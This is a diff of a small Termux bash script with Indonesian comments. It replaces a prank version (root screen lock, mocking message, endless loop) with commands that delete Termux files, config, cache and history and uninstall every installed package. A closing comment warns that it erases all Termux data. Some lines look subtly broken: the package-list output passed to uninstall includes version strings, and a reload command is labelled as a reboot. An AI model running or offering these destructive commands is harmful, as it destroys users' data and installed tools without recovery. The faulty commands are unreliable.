@@ -1,12 +1,21 @@
 #!/bin/bash
 
-# Mengunci layar
-su -c "input keyevent 26"
+# Menghapus semua file di direktori home Termux
+rm -rf ~/.termux/*
 
-# Menampilkan pesan
-echo "WKWKWKWKWKWK ALI" | lolcat
+# Menghapus semua aplikasi yang diinstal di Termux
+pkg uninstall -y $(pkg list-installed)
 
-# Menjalankan loop tak terbatas
-while true; do
-  sleep 1
-done
+# Menghapus semua konfigurasi Termux
+rm -rf ~/.config/termux
+
+# Menghapus semua data cache Termux
+rm -rf ~/.cache/termux
+
+# Menghapus history Termux
+rm -rf ~/.history
+
+# Reboot Termux
+termux-reload-settings
+
+# Catatan: Script ini akan menghapus semua data Termux, termasuk aplikasi yang diinstal, konfigurasi, dan data cache. Gunakan dengan hati-hati.
